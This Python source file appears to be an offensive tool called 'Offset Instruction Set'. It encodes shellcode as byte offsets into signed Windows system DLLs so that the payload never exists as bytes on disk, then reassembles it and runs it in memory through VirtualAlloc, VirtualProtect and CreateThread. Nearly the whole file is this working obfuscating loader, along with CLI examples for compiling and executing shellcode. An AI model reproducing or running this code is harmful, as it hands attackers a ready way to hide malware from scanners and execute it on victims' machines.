#!/usr/bin/env python3
"""
Offset Instruction Set (OIS) - Reference Implementation
========================================================

Compiler:   payload bytes → OIS format
Assembler:  OIS format → payload bytes (from signed substrates)
Executor:   OIS format → execution

The payload never exists as bytes until the moment of assembly.
The bytes come from signed Microsoft binaries.
The "malware" is just a list of coordinates.

Author: Chris Aziz / Bombadil Systems
"""

import os
import re
import sys
import json
import ctypes
import struct
import hashlib
import argparse
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, field
from pathlib import Path


# =============================================================================
# SUBSTRATE MANAGEMENT
# =============================================================================

# Standard Windows substrates
STANDARD_SUBSTRATES = {
    'k32':     r'C:\Windows\System32\kernel32.dll',
    'ntdll':   r'C:\Windows\System32\ntdll.dll',
    'u32':     r'C:\Windows\System32\user32.dll',
    'gdi32':   r'C:\Windows\System32\gdi32.dll',
    'advapi':  r'C:\Windows\System32\advapi32.dll',
    'ws2':     r'C:\Windows\System32\ws2_32.dll',
    'crypt':   r'C:\Windows\System32\crypt32.dll',
    'shell':   r'C:\Windows\System32\shell32.dll',
    'ole32':   r'C:\Windows\System32\ole32.dll',
    'msvcrt':  r'C:\Windows\System32\msvcrt.dll',
}


@dataclass
class Substrate:
    """A signed binary used as byte source."""
    id: str
    path: str
    data: bytes = field(default=None, repr=False)
    byte_index: Dict[int, List[int]] = field(default_factory=dict, repr=False)
    
    def load(self):
        """Load substrate data and build byte index."""
        if self.data is not None:
            return
        
        with open(self.path, 'rb') as f:
            self.data = f.read()
        
        # Build index: byte_value -> [offsets where it appears]
        self.byte_index = {i: [] for i in range(256)}
        for offset, byte_val in enumerate(self.data):
            self.byte_index[byte_val].append(offset)
    
    def has_byte(self, byte_val: int) -> bool:
        """Check if substrate contains this byte value."""
        self.load()
        return len(self.byte_index[byte_val]) > 0
    
    def get_offset_for_byte(self, byte_val: int, preference: int = 0) -> int:
        """Get an offset containing this byte value."""
        self.load()
        offsets = self.byte_index[byte_val]
        if not offsets:
            raise ValueError(f"Byte 0x{byte_val:02X} not found in {self.id}")
        return offsets[preference % len(offsets)]
    
    def read_byte(self, offset: int) -> int:
        """Read a byte at the given offset."""
        self.load()
        if offset < 0 or offset >= len(self.data):
            raise ValueError(f"Offset {offset} out of bounds for {self.id}")
        return self.data[offset]
    
    def coverage(self) -> Set[int]:
        """Return set of all byte values present in substrate."""
        self.load()
        return {i for i in range(256) if self.byte_index[i]}


class SubstrateManager:
    """Manages loading and caching of substrates."""
    
    def __init__(self):
        self.substrates: Dict[str, Substrate] = {}
        self.custom_paths: Dict[str, str] = {}
    
    def register(self, id: str, path: str):
        """Register a custom substrate."""
        self.custom_paths[id] = path
    
    def get(self, id: str) -> Substrate:
        """Get a substrate by ID, loading if necessary."""
        if id not in self.substrates:
            # Determine path
            if id in self.custom_paths:
                path = self.custom_paths[id]
            elif id in STANDARD_SUBSTRATES:
                path = STANDARD_SUBSTRATES[id]
            else:
                raise ValueError(f"Unknown substrate: {id}")
            
            self.substrates[id] = Substrate(id=id, path=path)
        
        return self.substrates[id]
    
    def analyze_coverage(self, substrate_ids: List[str]) -> Dict:
        """Analyze byte coverage across substrates."""
        all_bytes = set(range(256))
        covered = set()
        coverage_map = {}
        
        for sid in substrate_ids:
            substrate = self.get(sid)
            substrate_coverage = substrate.coverage()
            covered.update(substrate_coverage)
            coverage_map[sid] = {
                'total_bytes': len(substrate.data) if substrate.data else 0,
                'unique_values': len(substrate_coverage),
                'missing': sorted(all_bytes - substrate_coverage),
            }
        
        return {
            'substrates': coverage_map,
            'combined_coverage': len(covered),
            'missing': sorted(all_bytes - covered),
            'can_project_any': len(covered) == 256,
        }


# =============================================================================
# OIS DATA STRUCTURES
# =============================================================================

@dataclass
class ByteReference:
    """A reference to a single byte in a substrate."""
    substrate_id: str
    offset: int
    
    def __str__(self):
        return f"{self.substrate_id}:0x{self.offset:X}"


@dataclass 
class OISPayload:
    """A complete OIS payload."""
    version: str = "1.0"
    metadata: Dict = field(default_factory=dict)
    references: List[ByteReference] = field(default_factory=list)
    
    def to_compact(self) -> str:
        """Convert to compact string format."""
        parts = []
        current_substrate = None
        current_group = []
        
        for ref in self.references:
            if ref.substrate_id != current_substrate:
                # Flush current group
                if current_group:
                    if len(current_group) == 1:
                        parts.append(f"{current_substrate}:0x{current_group[0]:X}")
                    else:
                        offsets = ','.join(f"0x{o:X}" for o in current_group)
                        parts.append(f"{current_substrate}[{offsets}]")
                current_substrate = ref.substrate_id
                current_group = [ref.offset]
            else:
                current_group.append(ref.offset)
        
        # Flush final group
        if current_group:
            if len(current_group) == 1:
                parts.append(f"{current_substrate}:0x{current_group[0]:X}")
            else:
                offsets = ','.join(f"0x{o:X}" for o in current_group)
                parts.append(f"{current_substrate}[{offsets}]")
        
        return ','.join(parts)
    
    def to_json(self) -> str:
        """Convert to JSON format."""
        return json.dumps({
            'version': self.version,
            'metadata': self.metadata,
            'projection': [
                {'s': ref.substrate_id, 'o': ref.offset}
                for ref in self.references
            ]
        }, indent=2)
    
    def to_file_format(self) -> str:
        """Convert to full OIS file format."""
        lines = [
            f"OIS/{self.version}",
            "[SUBSTRATES]",
            "# Using default Windows substrates",
            "[METADATA]",
        ]
        
        for key, val in self.metadata.items():
            lines.append(f"{key}: {val}")
        
        lines.append("[PROJECTION]")
        lines.append(self.to_compact())
        lines.append("[END]")
        
        return '\n'.join(lines)


# =============================================================================
# OIS COMPILER
# =============================================================================

class OISCompiler:
    """Compiles arbitrary bytes into OIS format."""
    
    def __init__(self, substrate_ids: List[str] = None):
        self.manager = SubstrateManager()
        self.substrate_ids = substrate_ids or ['k32']
        
    def compile(self, payload: bytes, metadata: Dict = None) -> OISPayload:
        """
        Compile payload bytes into OIS format.
        
        Each byte in the payload is mapped to an offset in a substrate
        where that byte value exists.
        """
        # Track usage to distribute across offsets
        usage_count = {sid: {i: 0 for i in range(256)} for sid in self.substrate_ids}
        
        references = []
        
        for byte_val in payload:
            # Find a substrate that has this byte
            found = False
            for sid in self.substrate_ids:
                substrate = self.manager.get(sid)
                if substrate.has_byte(byte_val):
                    # Get offset, rotating through available offsets
                    pref = usage_count[sid][byte_val]
                    offset = substrate.get_offset_for_byte(byte_val, pref)
                    usage_count[sid][byte_val] += 1
                    
                    references.append(ByteReference(
                        substrate_id=sid,
                        offset=offset
                    ))
                    found = True
                    break
            
            if not found:
                raise ValueError(f"Byte 0x{byte_val:02X} not found in any substrate")
        
        return OISPayload(
            version="1.0",
            metadata=metadata or {'size': len(payload)},
            references=references
        )
    
    def verify_coverage(self, payload: bytes) -> bool:
        """Verify all payload bytes can be projected."""
        required = set(payload)
        available = set()
        
        for sid in self.substrate_ids:
            substrate = self.manager.get(sid)
            available.update(substrate.coverage())
        
        return required.issubset(available)


# =============================================================================
# OIS PARSER
# =============================================================================

class OISParser:
    """Parses OIS format into structured payload."""
    
    @staticmethod
    def parse_compact(text: str) -> OISPayload:
        """Parse compact OIS string format."""
        references = []
        
        # Handle grouped format: k32[0x1,0x2,0x3]
        # and single format: k32:0x1
        
        # Split by comma, but not inside brackets
        parts = []
        current = ""
        depth = 0
        
        for char in text:
            if char == '[':
                depth += 1
                current += char
            elif char == ']':
                depth -= 1
                current += char
            elif char == ',' and depth == 0:
                if current.strip():
                    parts.append(current.strip())
                current = ""
            else:
                current += char
        
        if current.strip():
            parts.append(current.strip())
        
        for part in parts:
            # Check for grouped format
            match = re.match(r'(\w+)\[(.*)\]', part)
            if match:
                substrate_id = match.group(1)
                offsets_str = match.group(2)
                for offset_str in offsets_str.split(','):
                    offset_str = offset_str.strip()
                    if offset_str.startswith('0x') or offset_str.startswith('0X'):
                        offset = int(offset_str, 16)
                    else:
                        offset = int(offset_str)
                    references.append(ByteReference(substrate_id, offset))
            else:
                # Single format: substrate:offset
                match = re.match(r'(\w+):(.+)', part)
                if match:
                    substrate_id = match.group(1)
                    offset_str = match.group(2).strip()
                    if offset_str.startswith('0x') or offset_str.startswith('0X'):
                        offset = int(offset_str, 16)
                    else:
                        offset = int(offset_str)
                    references.append(ByteReference(substrate_id, offset))
        
        return OISPayload(references=references)
    
    @staticmethod
    def parse_json(text: str) -> OISPayload:
        """Parse JSON OIS format."""
        data = json.loads(text)
        
        references = [
            ByteReference(substrate_id=ref['s'], offset=ref['o'])
            for ref in data.get('projection', [])
        ]
        
        return OISPayload(
            version=data.get('version', '1.0'),
            metadata=data.get('metadata', {}),
            references=references
        )
    
    @staticmethod
    def parse_file(text: str) -> OISPayload:
        """Parse full OIS file format."""
        lines = text.strip().split('\n')
        
        version = "1.0"
        metadata = {}
        projection_lines = []
        
        section = None
        
        for line in lines:
            line = line.strip()
            
            if line.startswith('OIS/'):
                version = line.split('/')[1]
            elif line == '[SUBSTRATES]':
                section = 'substrates'
            elif line == '[METADATA]':
                section = 'metadata'
            elif line == '[PROJECTION]':
                section = 'projection'
            elif line == '[END]':
                break
            elif line.startswith('#'):
                continue
            elif section == 'metadata' and ':' in line:
                key, val = line.split(':', 1)
                metadata[key.strip()] = val.strip()
            elif section == 'projection' and line:
                projection_lines.append(line)
        
        # Parse projection
        projection_text = ''.join(projection_lines)
        payload = OISParser.parse_compact(projection_text)
        payload.version = version
        payload.metadata = metadata
        
        return payload


# =============================================================================
# OIS ASSEMBLER
# =============================================================================

class OISAssembler:
    """Assembles OIS payload into executable bytes."""
    
    def __init__(self):
        self.manager = SubstrateManager()
    
    def assemble(self, payload: OISPayload) -> bytes:
        """
        Assemble OIS payload into bytes.
        
        Reads each referenced offset from its substrate and
        concatenates the bytes.
        """
        result = bytearray()
        
        for ref in payload.references:
            substrate = self.manager.get(ref.substrate_id)
            byte_val = substrate.read_byte(ref.offset)
            result.append(byte_val)
        
        return bytes(result)
    
    def assemble_from_string(self, ois_string: str) -> bytes:
        """Assemble from compact string format."""
        payload = OISParser.parse_compact(ois_string)
        return self.assemble(payload)
    
    def assemble_from_json(self, json_string: str) -> bytes:
        """Assemble from JSON format."""
        payload = OISParser.parse_json(json_string)
        return self.assemble(payload)
    
    def assemble_from_file(self, filepath: str) -> bytes:
        """Assemble from OIS file."""
        with open(filepath, 'r') as f:
            content = f.read()
        
        if content.strip().startswith('{'):
            payload = OISParser.parse_json(content)
        elif content.strip().startswith('OIS/'):
            payload = OISParser.parse_file(content)
        else:
            payload = OISParser.parse_compact(content)
        
        return self.assemble(payload)


# =============================================================================
# OIS EXECUTOR
# =============================================================================

class OISExecutor:
    """Executes OIS payloads."""
    
    def __init__(self):
        self.assembler = OISAssembler()
        
    def execute(self, payload: OISPayload, method: str = 'thread') -> int:
        """
        Assemble and execute OIS payload.
        
        Methods:
        - 'direct': Direct function call
        - 'thread': CreateThread
        - 'callback': EnumWindows callback
        """
        shellcode = self.assembler.assemble(payload)
        return self._execute_shellcode(shellcode, method)
    
    def _execute_shellcode(self, shellcode: bytes, method: str) -> int:
        """Execute assembled shellcode."""
        if sys.platform != 'win32':
            raise RuntimeError("Execution only supported on Windows")
        
        kernel32 = ctypes.windll.kernel32
        
        # Allocate memory
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_READWRITE = 0x04
        PAGE_EXECUTE_READ = 0x20
        
        # Set up proper argtypes
        kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        kernel32.VirtualAlloc.restype = ctypes.c_void_p
        
        kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        kernel32.VirtualProtect.restype = ctypes.c_bool
        
        kernel32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
        kernel32.VirtualFree.restype = ctypes.c_bool
        
        addr = kernel32.VirtualAlloc(
            None,
            len(shellcode),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
        
        if not addr:
            raise RuntimeError("VirtualAlloc failed")
        
        # Copy shellcode
        ctypes.memmove(addr, shellcode, len(shellcode))
        
        # Change to executable
        old_protect = ctypes.c_ulong()
        kernel32.VirtualProtect(
            ctypes.c_void_p(addr),
            len(shellcode),
            PAGE_EXECUTE_READ,
            ctypes.byref(old_protect)
        )
        
        # Execute based on method
        if method == 'direct':
            func = ctypes.CFUNCTYPE(ctypes.c_uint64)(addr)
            result = func()
        
        elif method == 'thread':
            kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
            kernel32.CreateThread.restype = ctypes.c_void_p
            kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
            kernel32.WaitForSingleObject.restype = ctypes.c_ulong
            kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
            kernel32.CloseHandle.restype = ctypes.c_bool
            
            thread_id = ctypes.c_ulong()
            handle = kernel32.CreateThread(
                None, 0, addr, None, 0, ctypes.byref(thread_id)
            )
            kernel32.WaitForSingleObject(handle, 0xFFFFFFFF)
            kernel32.CloseHandle(handle)
            result = 0
        
        else:
            raise ValueError(f"Unknown execution method: {method}")
        
        # Cleanup
        kernel32.VirtualFree(ctypes.c_void_p(addr), 0, 0x8000)
        
        return result


# =============================================================================
# CLI INTERFACE
# =============================================================================

def cmd_compile(args):
    """Compile binary to OIS."""
    with open(args.input, 'rb') as f:
        payload = f.read()
    
    substrates = args.substrates.split(',') if args.substrates else ['k32']
    
    compiler = OISCompiler(substrate_ids=substrates)
    
    if not compiler.verify_coverage(payload):
        print("ERROR: Not all payload bytes available in substrates")
        return 1
    
    ois = compiler.compile(payload, metadata={
        'source': args.input,
        'size': len(payload),
        'hash': hashlib.sha256(payload).hexdigest()[:16],
    })
    
    # Output
    if args.format == 'compact':
        output = ois.to_compact()
    elif args.format == 'json':
        output = ois.to_json()
    else:
        output = ois.to_file_format()
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(output)
        print(f"Compiled {len(payload)} bytes -> {args.output}")
    else:
        print(output)
    
    return 0


def cmd_assemble(args):
    """Assemble OIS to binary."""
    assembler = OISAssembler()
    
    shellcode = assembler.assemble_from_file(args.input)
    
    if args.output:
        with open(args.output, 'wb') as f:
            f.write(shellcode)
        print(f"Assembled {len(shellcode)} bytes -> {args.output}")
    else:
        print(f"Assembled {len(shellcode)} bytes:")
        print(shellcode.hex())
    
    return 0


def cmd_execute(args):
    """Execute OIS payload."""
    assembler = OISAssembler()
    
    with open(args.input, 'r') as f:
        content = f.read()
    
    if content.strip().startswith('{'):
        payload = OISParser.parse_json(content)
    elif content.strip().startswith('OIS/'):
        payload = OISParser.parse_file(content)
    else:
        payload = OISParser.parse_compact(content)
    
    executor = OISExecutor()
    
    print(f"Executing OIS payload ({len(payload.references)} byte references)...")
    print(f"Method: {args.method}")
    
    result = executor.execute(payload, method=args.method)
    
    print(f"Execution complete. Return: {result}")
    
    return 0


def cmd_analyze(args):
    """Analyze substrate coverage."""
    substrates = args.substrates.split(',') if args.substrates else list(STANDARD_SUBSTRATES.keys())
    
    manager = SubstrateManager()
    analysis = manager.analyze_coverage(substrates)
    
    print("Substrate Coverage Analysis")
    print("=" * 50)
    
    for sid, info in analysis['substrates'].items():
        print(f"\n{sid}:")
        print(f"  Size: {info['total_bytes']:,} bytes")
        print(f"  Unique byte values: {info['unique_values']}/256")
        if info['missing']:
            print(f"  Missing: {info['missing'][:10]}{'...' if len(info['missing']) > 10 else ''}")
    
    print(f"\nCombined coverage: {analysis['combined_coverage']}/256")
    print(f"Can project any payload: {analysis['can_project_any']}")
    
    return 0


def cmd_validate(args):
    """Validate OIS payload."""
    assembler = OISAssembler()
    
    try:
        shellcode = assembler.assemble_from_file(args.input)
        print(f"✓ Valid OIS payload")
        print(f"  Assembled size: {len(shellcode)} bytes")
        print(f"  SHA256: {hashlib.sha256(shellcode).hexdigest()}")
        return 0
    except Exception as e:
        print(f"✗ Invalid OIS payload: {e}")
        return 1


def main():
    parser = argparse.ArgumentParser(
        description="Offset Instruction Set (OIS) Tools",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Commands:
  compile   Convert binary payload to OIS format
  assemble  Convert OIS format to binary
  execute   Execute OIS payload
  analyze   Analyze substrate byte coverage
  validate  Validate OIS payload

Examples:
  %(prog)s compile shellcode.bin -o payload.ois
  %(prog)s assemble payload.ois -o shellcode.bin
  %(prog)s execute payload.ois --method thread
  %(prog)s analyze --substrates k32,ntdll,u32
        """
    )
    
    subparsers = parser.add_subparsers(dest='command')
    
    # Compile
    p_compile = subparsers.add_parser('compile', help='Compile binary to OIS')
    p_compile.add_argument('input', help='Input binary file')
    p_compile.add_argument('-o', '--output', help='Output OIS file')
    p_compile.add_argument('-s', '--substrates', default='k32', help='Comma-separated substrate IDs')
    p_compile.add_argument('-f', '--format', choices=['compact', 'json', 'file'], default='file', help='Output format')
    
    # Assemble
    p_assemble = subparsers.add_parser('assemble', help='Assemble OIS to binary')
    p_assemble.add_argument('input', help='Input OIS file')
    p_assemble.add_argument('-o', '--output', help='Output binary file')
    
    # Execute
    p_execute = subparsers.add_parser('execute', help='Execute OIS payload')
    p_execute.add_argument('input', help='Input OIS file')
    p_execute.add_argument('-m', '--method', choices=['direct', 'thread', 'callback'], default='thread', help='Execution method')
    
    # Analyze
    p_analyze = subparsers.add_parser('analyze', help='Analyze substrate coverage')
    p_analyze.add_argument('-s', '--substrates', help='Comma-separated substrate IDs')
    
    # Validate
    p_validate = subparsers.add_parser('validate', help='Validate OIS payload')
    p_validate.add_argument('input', help='Input OIS file')
    
    args = parser.parse_args()
    
    if args.command == 'compile':
        return cmd_compile(args)
    elif args.command == 'assemble':
        return cmd_assemble(args)
    elif args.command == 'execute':
        return cmd_execute(args)
    elif args.command == 'analyze':
        return cmd_analyze(args)
    elif args.command == 'validate':
        return cmd_validate(args)
    else:
        parser.print_help()
        return 1


if __name__ == '__main__':
    sys.exit(main())
